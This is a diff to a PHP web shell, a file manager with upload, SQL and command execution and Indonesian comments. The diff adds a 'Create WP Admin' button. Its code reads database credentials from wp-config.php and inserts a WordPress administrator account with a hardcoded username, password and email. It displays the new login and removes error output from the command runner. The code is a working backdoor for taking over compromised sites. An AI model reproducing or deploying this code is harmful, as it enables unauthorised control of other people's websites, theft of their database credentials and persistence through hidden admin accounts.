@@ -259,6 +259,69 @@ if(isset($_POST['berkas']) && is_string($_POST['berkas']))
 	$c_h_dir_comm($default_dir);
 }
 $default_dir = str_replace("\\", "/", $default_dir);
+if (isset($_POST['create_wp_admin'])) {
+    // Tentukan path ke wp-config.php berdasarkan document root
+    $wp_config_path = getcwd() . '/wp-config.php';
+    if (file_exists($wp_config_path)) {
+        echo "wp-config.php ditemukan di: " . $wp_config_path;
+        // Lanjutkan proses dengan file ini, misalnya, baca isinya:
+        $config_content = file_get_contents($wp_config_path);
+        // Fungsi untuk mengambil nilai constant dari wp-config.php
+        function get_wp_config_value($content, $constant) {
+            if (preg_match("/define\(\s*'".preg_quote($constant, '/')."',\s*'([^']+)'/", $content, $matches)) {
+                return $matches[1];
+            }
+            return null;
+        }
+        
+        $db_host = get_wp_config_value($config_content, 'DB_HOST');
+        $db_name = get_wp_config_value($config_content, 'DB_NAME');
+        $db_user = get_wp_config_value($config_content, 'DB_USER');
+        $db_pass = get_wp_config_value($config_content, 'DB_PASSWORD');
+        
+        // Ambil table prefix; default ke wp_ jika tidak ditemukan
+        if (preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $config_content, $matches)) {
+            $db_prefix = $matches[1];
+        } else {
+            $db_prefix = 'wp_';
+        }
+        
+        // Koneksi ke database
+        $conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
+        if (!$conn) {
+            $error_msg = "Koneksi gagal: " . mysqli_connect_error();
+        } else {
+            // Nilai admin yang akan dibuat
+            $admin_username      = 'rahman';
+            $admin_password_plain = 'xm4nxp1337';
+            $admin_password      = md5($admin_password_plain); // MD5 sesuai referensi
+            $admin_email         = 'rahmanganteng1337@proton.me'; // Ubah jika perlu
+
+            // Sisipkan user admin ke tabel wp_users
+            $insert_user = "INSERT INTO `{$db_prefix}users` 
+                (user_login, user_pass, user_nicename, user_email, user_status) 
+                VALUES ('{$admin_username}', '{$admin_password}', 'WordPress Administrator', '{$admin_email}', 0)";
+            if (!mysqli_query($conn, $insert_user)) {
+                $error_msg = "Error inserting user: " . mysqli_error($conn);
+            } else {
+                // Dapatkan ID user yang baru dibuat
+                $user_id = mysqli_insert_id($conn);
+                // Tambahkan meta capabilities untuk memberikan hak administrator
+                $capabilities = 'a:1:{s:13:"administrator";s:1:"1";}';
+                $insert_meta  = "INSERT INTO `{$db_prefix}usermeta` 
+                    (user_id, meta_key, meta_value) 
+                    VALUES ('{$user_id}', '{$db_prefix}capabilities', '{$capabilities}')";
+                if (!mysqli_query($conn, $insert_meta)) {
+                    $error_msg = "Error inserting usermeta: " . mysqli_error($conn);
+                } else {
+                    $success_msg = "Admin WordPress berhasil dibuat!<br>Username: <strong>{$admin_username}</strong> | Password: <strong>{$admin_password_plain}</strong>";
+                }
+            }
+        }
+    } else {
+        echo "wp-config.php tidak ditemukan di: " . getcwd();
+    }
+}
 
 // ===========================================================================
 // Penanganan aksi-aksi (download, hapus, buat, rename, SQL, dsb.)
@@ -870,7 +933,22 @@ a {
      style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
     SQL
   </a>
+    <!-- Tombol Create WP Admin -->
+    <form method="POST" action="" style="display:inline-block;">
+      <button type="submit" name="create_wp_admin" 
+              style="padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; border: none; border-radius: 5px;">
+          Create WP Admin
+      </button>
+  </form>
 </div>
+<?php
+// Tampilkan pesan sukses atau error jika ada
+if (isset($success_msg)) {
+    echo '<div style="text-align: center; color: #0f0; margin: 10px;">' . $success_msg . '</div>';
+} elseif (isset($error_msg)) {
+    echo '<div style="text-align: center; color: #f00; margin: 10px;">' . $error_msg . '</div>';
+}
+?>
 <!-- Tempelkan potongan kode berikut di lokasi bagian upload, menggantikan kode upload lama -->
 <div class="upload-container">
     <!-- Metode Upload Tradisional -->
@@ -1027,8 +1105,7 @@ if ($awal == "sistem_kom") {
         
         // Tampilkan output dan error
         print '<pre style="max-height: 350px; overflow: auto; border: 1px solid #777; padding: 5px;">';
-        print 'Output:<br>' . htmlspecialchars($output) . '<br>';
-        print 'Error:<br>' . htmlspecialchars($error) . '</pre><hr>';
+        print 'Output:<br>' . htmlspecialchars($output) . '<br></pre><hr>';
     }
     print '<input type="text" id="emr_et_atash" style="width: 500px;"> <button type="button" class="btn" onclick="sistemKom();">确定</button>';
 }
